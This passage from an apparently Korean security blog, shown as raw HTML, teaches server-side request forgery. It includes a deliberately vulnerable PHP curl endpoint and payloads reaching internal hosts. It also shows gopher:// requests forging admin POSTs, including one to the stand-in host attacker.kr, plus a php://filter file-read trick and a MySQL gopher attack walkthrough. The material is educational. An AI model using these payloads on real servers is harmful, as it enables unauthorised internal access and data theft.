constant\">CURLOPT_URL</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'url'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">curl_setopt</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c_i</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">CURLOPT_TIMEOUT</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">curl_setopt</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c_i</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">CURLOPT_CONNECTTIMEOUT</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">curl_setopt</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c_i</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">CURLOPT_RETURNTRANSFER</span><span class=\"token punctuation\">,</span> <span class=\"token constant boolean\">TRUE</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">curl_setopt</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c_i</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">CURLOPT_FOLLOWLOCATION</span><span class=\"token punctuation\">,</span> <span class=\"token constant boolean\">FALSE</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$result</span> <span class=\"token operator\">=</span> <span class=\"token function\">curl_exec</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c_i</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">curl_close</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c_i</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token delimiter important\">?></span></span></code></pre></div>\n<ul>\n<li>내부망에 접근이 가능한 영역에 접속</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"php\"><pre class=\"language-php\"><code class=\"language-php\"><span class=\"token comment\"># http://victim/?url=http://localhost/api/admin</span></code></pre></div>\n<ul>\n<li>내부망 서버에 접속</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"php\"><pre class=\"language-php\"><code class=\"language-php\"><span class=\"token comment\"># http://victim/?url=http://localhost:8000/</span></code></pre></div>\n<ul>\n<li><code class=\"language-text\">Gopher</code> 를 활용한 TCP 연결후 POST 요청</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"php\"><pre class=\"language-php\"><code class=\"language-php\"><span class=\"token comment\"># http://victim/?url=gopher://localhost:8000/_POST%20HTTP/1.1%0d%0a</span></code></pre></div>\n<h1 id=\"ssrf-exploit-technique\" style=\"position:relative;\"><a href=\"#ssrf-exploit-technique\" aria-label=\"ssrf exploit technique permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>SSRF Exploit Technique</h1>\n<h2 id=\"ssrf-공격시-사용-가능한-protocol-종류\" style=\"position:relative;\"><a href=\"#ssrf-%EA%B3%B5%EA%B2%A9%EC%8B%9C-%EC%82%AC%EC%9A%A9-%EA%B0%80%EB%8A%A5%ED%95%9C-protocol-%EC%A2%85%EB%A5%98\" aria-label=\"ssrf 공격시 사용 가능한 protocol 종류 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>SSRF 공격시 사용 가능한 Protocol 종류</h2>\n<ul>\n<li><code class=\"language-text\">http://</code> : HTTP 접속 용</li>\n<li><code class=\"language-text\">ftp://</code> : ftp 접속 용</li>\n<li><code class=\"language-text\">dict://</code> : RFC 2229 서버 액세스 용</li>\n<li><code class=\"language-text\">sftp://</code> : sftp 접속 용</li>\n<li><code class=\"language-text\">tftp://</code> : tftp 접속 용</li>\n<li><code class=\"language-text\">ldap://</code> : JAVA ES 솔루션 Directory Server 용</li>\n<li><code class=\"language-text\">gopher://</code> : TCP 연결용</li>\n<li><code class=\"language-text\">netdoc://</code> : JDK9 버전 이하에서 사용, URL을 통해 외부적 네트워크 문서 참조용</li>\n<li><code class=\"language-text\">file://</code> : 파일 읽기용</li>\n</ul>\n<h3 id=\"php-wrapper-only-php\" style=\"position:relative;\"><a href=\"#php-wrapper-only-php\" aria-label=\"php wrapper only php permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>PHP Wrapper (Only PHP)</h3>\n<div class=\"gatsby-highlight\" data-language=\"php\"><pre class=\"language-php\"><code class=\"language-php\"><span class=\"token comment\"># PHP://filter/convert.base64-encode/resource=파일 경로</span></code></pre></div>\n<h3 id=\"gopher-protocol을-활용한-http-패킷-전송\" style=\"position:relative;\"><a href=\"#gopher-protocol%EC%9D%84-%ED%99%9C%EC%9A%A9%ED%95%9C-http-%ED%8C%A8%ED%82%B7-%EC%A0%84%EC%86%A1\" aria-label=\"gopher protocol을 활용한 http 패킷 전송 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Gopher Protocol을 활용한 HTTP 패킷 전송</h3>\n<ul>\n<li>HTTP 패킷을 그대로 만들어서 전송이 가능합니다.</li>\n<li>구조는 다음과 같은 형태로 구성하여 전송을 진행합니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"php\"><pre class=\"language-php\"><code class=\"language-php\">gopher<span class=\"token punctuation\">:</span><span class=\"token comment\">//&lt;proxy-server>/_GET%20http://&lt;attacker.kr:80>/EX%20HTTP/1.1%0d%0a</span>\ngopher<span class=\"token punctuation\">:</span><span class=\"token comment\">//&lt;proxy-server>/_POST%20http://&lt;attacker.kr:80>/EX%20HTTP/1.1%0d%0aContent-Length:21%0d%0aCookie:%20c_s=1%0d%0adata={a:1}</span></code></pre></div>\n<p><strong>Gopher HTTP (POST)</strong></p>\n<ul>\n<li>정상적인 HTTP POST 요청 패킷</li>\n<li><code class=\"language-text\">\\r\\n</code> 을 URL Encoding 하면 %0d%0a 사용됩니다.</li>\n<li><code class=\"language-text\">Content-Length</code> 헤더가 존재해야 POST Body 데이터가 전송이 됩니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"php\"><pre class=\"language-php\"><code class=\"language-php\"><span class=\"token constant\">POST</span> <span class=\"token operator\">/</span>data <span class=\"token constant\">HTTP</span><span class=\"token operator\">/</span><span class=\"token number\">1.1</span>\\r\\n\nContent<span class=\"token operator\">-</span>Type<span class=\"token punctuation\">:</span>application<span class=\"token operator\">/</span>x<span class=\"token operator\">-</span>www<span class=\"token operator\">-</span>form<span class=\"token operator\">-</span>urlencoded\\r\\n\nContent<span class=\"token operator\">-</span>Length<span class=\"token punctuation\">:</span><span class=\"token constant\">POST_BODY</span> 길이\\r\\n\n\\r\\n\n<span class=\"token constant\">POST_BODY</span></code></pre></div>\n<ul>\n<li>Gopher 프로토콜을 활용하여 POST 패킷을 전송할 경우</li>\n<li>Gopher를 사용할 때 첫 한바이트는 건너 뛰고 사용해야 합니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"php\"><pre class=\"language-php\"><code class=\"language-php\">gopher<span class=\"token punctuation\">:</span><span class=\"token comment\">//127.0.0.1/ _POST%20/data%20HTTP/1.1%0d%0aContent-Type:application/x-www-form-urlencoded%0d%0aContent-Length:%209%0d%0a%0d%0aPOST_BODY</span></code></pre></div>\n<p><strong>Gopher HTTP (Header)</strong></p>\n<ul>\n<li>만약 다음 PHP 코드로 구성되어 있을 경우 다음과 같이 Gopher를 활용하여 통과할 수 있습니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"php\"><pre class=\"language-php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_SERVER</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'HTTP_XXXX'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\t\t<span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"True\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token delimiter important\">?></span></span></code></pre></div>\n<div class=\"gatsby-highlight\" data-language=\"php\"><pre class=\"language-php\"><code class=\"language-php\"><span class=\"token constant\">GET</span> <span class=\"token operator\">/</span> <span class=\"token constant\">HTTP</span><span class=\"token operator\">/</span><span class=\"token number\">1.1</span>\\r\\n\n<span class=\"token constant\">XXXX</span><span class=\"token punctuation\">:</span><span class=\"token number\">1234</span>\\r\\n\\r\\n</code></pre></div>\n<ul>\n<li>위의 예시를 통해 다음 조건이 걸려 있다면 다음과 같이 구성을 하면됩니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"php\"><pre class=\"language-php\"><code class=\"language-php\"><span class=\"token variable\">$_SERVER</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'REMOTE_ADDR'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">===</span> <span class=\"token string single-quoted-string\">'127.0.0.1'</span>\n<span class=\"token variable\">$_SERVER</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'HTTP_ADMIN'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">===</span> <span class=\"token string single-quoted-string\">'admin'</span>\n<span class=\"token variable\">$_COOKIE</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'admin'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">===</span> <span class=\"token string single-quoted-string\">'admin'</span>\n<span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'admin'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">===</span> <span class=\"token string single-quoted-string\">'admin'</span></code></pre></div>\n<ul>\n<li>공격 요청 패킷 정렬</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"php\"><pre class=\"language-php\"><code class=\"language-php\">gopher<span class=\"token punctuation\">:</span><span class=\"token comment\">//127.0.0.1:80/_POST /api/admin.php HTTP/1.1</span>\nHost<span class=\"token punctuation\">:</span> <span class=\"token number\">127.0</span><span class=\"token number\">.0</span><span class=\"token number\">.1</span>\\r\\n\n<span class=\"token constant\">ADMIN</span><span class=\"token punctuation\">:</span> admin\\r\\n\nCookie<span class=\"token punctuation\">:</span> admin<span class=\"token operator\">=</span>admin<span class=\"token punctuation\">;</span>\\r\\n\nConnection<span class=\"token punctuation\">:</span> close\\r\\n\nContent<span class=\"token operator\">-</span>Length<span class=\"token punctuation\">:</span> <span class=\"token number\">11</span>\\r\\n\nContent<span class=\"token operator\">-</span>Type<span class=\"token punctuation\">:</span> application<span class=\"token operator\">/</span>x<span class=\"token operator\">-</span>www<span class=\"token operator\">-</span>form<span class=\"token operator\">-</span>urlencoded\\r\\n\n\\r\\n\n\\r\\n\nadmin<span class=\"token operator\">=</span>admin</code></pre></div>\n<ul>\n<li>gopher 프로토콜 포맷 정렬</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"php\"><pre class=\"language-php\"><code class=\"language-php\">gopher<span class=\"token punctuation\">:</span><span class=\"token comment\">//127.0.0.1:80/_POST%20/api/admin.php%20HTTP/1.1%0d%0aHost:%20127.0.0.1%0d%0aADMIN:%20admin%0d%0aCookie:%20admin=admin;%0d%0aConnection:%20close%0d%0aContent-Length:%2011%0d%0aContent-Type:%20application/x-www-form-urlencoded%0d%0a%0d%0aadmin=admin</span></code></pre></div>\n<h3 id=\"gopher-프로토콜-활용-데이터베이스-접근\" style=\"position:relative;\"><a href=\"#gopher-%ED%94%84%EB%A1%9C%ED%86%A0%EC%BD%9C-%ED%99%9C%EC%9A%A9-%EB%8D%B0%EC%9D%B4%ED%84%B0%EB%B2%A0%EC%9D%B4%EC%8A%A4-%EC%A0%91%EA%B7%BC\" aria-label=\"gopher 프로토콜 활용 데이터베이스 접근 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Gopher 프로토콜 활용 데이터베이스 접근</h3>\n<p><strong>취약한 대상 애플리케이션 소스 코드</strong></p>\n<div class=\"gatsby-highlight\" data-language=\"php\"><pre class=\"language-php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n    <span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token variable\">$conn</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysqli_connect</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'localhost'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'root'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">''</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'db_perpus'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'source'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token variable\">$source</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'source'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token variable\">$source</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">''</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'url'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token variable\">$result</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'Do Not Url..'</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$c_i</span> <span class=\"token operator\">=</span> <span class=\"token function\">curl_init</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">curl_setopt</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c_i</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">CURLOPT_URL</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'url'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">curl_setopt</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c_i</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">CURLOPT_TIMEOUT</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">curl_setopt</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c_i</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">CURLOPT_CONNECTTIMEOUT</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">curl_setopt</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c_i</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">CURLOPT_RETURNTRANSFER</span><span class=\"token punctuation\">,</span> <span class=\"token constant boolean\">TRUE</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">curl_setopt</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c_i</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">CURLOPT_FOLLOWLOCATION</span><span class=\"token punctuation\">,</span> <span class=\"token constant boolean\">FALSE</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$result</span> <span class=\"token operator\">=</span> <span class=\"token function\">curl_exec</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c_i</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">curl_close</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c_i</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token delimiter important\">?></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>html</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>head</span><span class=\"token punctuation\">></span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>title</span><span class=\"token punctuation\">></span></span>gopher ssrf database<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>title</span><span class=\"token punctuation\">></span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>meta</span> <span class=\"token attr-name\">charset</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>utf-8<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>head</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>body</span><span class=\"token punctuation\">></span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>h1</span><span class=\"token punctuation\">></span></span>gopher ssrf database<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>h1</span><span class=\"token punctuation\">></span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>form</span> <span class=\"token attr-name\">action</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span><span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">method</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>get<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>\n        <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>input</span> <span class=\"token attr-name\">type</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>text<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">name</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>url<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">placeholder</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>url<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>\n        <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>input</span> <span class=\"token attr-name\">type</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>submit<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">name</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>submit<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">value</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>submit<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>form</span><span class=\"token punctuation\">></span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>a</span> <span class=\"token attr-name\">href</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>?source<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>source<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>a</span><span class=\"token punctuation\">></span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>hr</span><span class=\"token punctuation\">></span></span>\n    <span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> <span class=\"token keyword\">echo</span> <span class=\"token variable\">$result</span><span class=\"token delimiter important\">?></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>html</span><span class=\"token punctuation\">></span></span></code></pre></div>\n<ul>\n<li>대상 애플리케이션에서 <code class=\"language-text\">mysqli_connect</code> 를 통해 <code class=\"language-text\">database host</code>, <code class=\"language-text\">database id</code>, <code class=\"language-text\">pw</code>, <code class=\"language-text\">database name</code> 으로 구성되어 있습니다.</li>\n<li>현재 설정된 데이터를 확인해보면 패스워드가 설정되지 않고 운영이 되고 있습니다.</li>\n<li>gopher를 활용하기에 앞서 해당 애플리케이션의 데이터베이스 버전 정보와 서버 환경의 데이터를 수집을 진행합니다.</li>\n<li>mysql 을 사용하기 때문에, 실제 같은 환경을 구축한 후 mysql를 사용하여 로그인을 진행하면서 패킷을 수집합니다. 이때 대상 환경이 패스워드가 설정되어 있지 않기 때문에 로그인을 하지 않은 상태에서 id,host 정보만으로 접근을 시도합니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"php\"><pre class=\"language-php\"><code class=\"language-php\">mysql <span class=\"token operator\">-</span>h <span class=\"token number\">127.0</span><span class=\"token number\">.0</span><span class=\"token number\">.1</span> <span class=\"token operator\">-</span>u root</code></pre></div>\n<ul>\n<li>연결을 진행한 후 패킷을 수집시 raw 데이터를 파싱해서 저장합니다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 56.111111111111114%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAYAAAB/Ca1DAAAACXBIWXMAAAsTAAALEwEAmpwYAAACo0lEQVQoz1WSy08TURSHZ20U91KdTplCy1gfoEgpCFapIT5igJLwb2jYuDC60BjfG0xMUONKTdSoC7G0pbxKW6Xy8IG6ANoCCoqPpO1MsfKZmWICN/nyO+fm5svJvVewlduw2QtUVlbg2OHAbJEwSxKWkhJkq0yZrcxAlkswS2ZEUUQ0i5jNIhZJZJskIlkk5FIZwaO4OCDX4La6uH25k9CTF/gePKPnwTP6nvoY6u4j0hshGooaDPkHGfD109cdYnJsgksdZ9m50UqdqYK64goEj7SPRrGOI3I9T+71EI8uEOlPEBtM8Wr4C68i63kd/cpIbIFYeI6PnzQud1xHEbbg3KhQvcGO4LHvxV3i5qjdzf27fkIDC/gDCQLBpJFrCQQTBFbT55siOvKL8yev4BBM1Gx24CxSEE6UN3KstIHjtgbu3+lhYGiRYDBBb2/SyFAoRSj0v06u9in8/mli8d9cOHW1ICzajnOTgnDUXk+T3MBhs4tHXc8ZDU8T653kzfAMbyIJPozO8WlinsmxOT7ojM4WcizF/GyWG6evoQjFhQl14UGrfpku3FudPLz1mLD/Lf3dcYYC4wwPfCQW/sx4fIr3EzO8G5/h7eg0M5NJ5j8nUX9m6DxzjfK1wia5loOmajxiDcGXYZaykFpMM/c9y+y3LF9/qCylc+tQc3k0dRl9dV28iV3Yguu/0CPvw72tFo+ljvhgxDi0ktcP5wus5Fn5m4e/hVrPfP4PmqqtCjsNoT5htf4oTaU1NIr7OWRyMujrQ83lSKfTLC8vk8lkjDqXy6GqGllVRdNyaJpGNpM1hJ3nbqAIJlxFDuPrCFU7K9mjVFLl2IO3xUt7ezter5e2trZ1tLS00NzcTGtrq4He6/v1rv0oko3dZQ52WbfzDwqUSA5WfSoQAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"Gopher Wireshark\"\n        title=\"Gopher Wireshark\"\n        src=\"/static/9380958e37abacec33b7ce490b8e2342/37523/0.png\"\n        srcset=\"/static/9380958e37abacec33b7ce490b8e2342/e9ff0/0.png 180w,\n/static/9380958e37abacec33b7ce490b8e2342/f21e7/0.png 360w,\n/static/9380958e37abacec33b7ce490b8e2342/37523/0.png 720w,\n/static/9380958e37abacec33b7ce490b8e2342/302a4/0.png 1080w,\n/static/9380958e37abacec33b7ce490b8e2342/07a9c/0.png 1440w,\n/static/9380958e37abacec33b7ce490b8e2342/29114/0.png 1920w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p><strong>gopher 패킷 구축</strong></p>\n<ul>\n<li>mysql 로 로그인한 해당 패킷 raw 데이터를 기반으로 gopher 패킷을 생성하여 쿼리를 수행할 수 있는 하나의 페이로드를 만들어보겠습니다.</li>\n</ul>\n<p><a href=\"https://github.com/tarunkant/Automation/blob/master/SSRF-through-Gopher.py\">Automation/SSRF-through-Gopher.py at master · tarunkant/Automation</a></p>\n<ul>\n<li>위 script를 활용하여 raw 데이터를 gopher 패킷으로 formatting 할 수 있도록 도와주는 도구를 사용하였습니다.</li>\n<li>직접 구성을 해서 만드는 것도 추천합니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" 